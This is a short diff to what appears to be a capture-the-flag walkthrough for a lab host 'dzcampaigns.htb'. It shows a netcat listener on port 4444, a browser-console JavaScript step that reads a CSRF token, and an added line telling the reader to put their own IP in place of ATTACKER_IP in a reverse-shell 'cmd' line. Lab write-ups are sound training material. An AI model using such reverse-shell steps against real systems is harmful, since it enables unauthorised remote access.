@@ -82,6 +82,8 @@ nc -lvnp 4444
 
 Then at `http://dzcampaigns.htb/character/15/edit` → DevTools → Console:
 
+Two swaps in this block: `ATTACKER_IP` → your tun0 IP (in the `cmd` line), and `15` → your character ID (in the fetch URL).
+
 ```javascript
 const csrf = document.querySelector('[name="_csrf"]').value;
 const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };
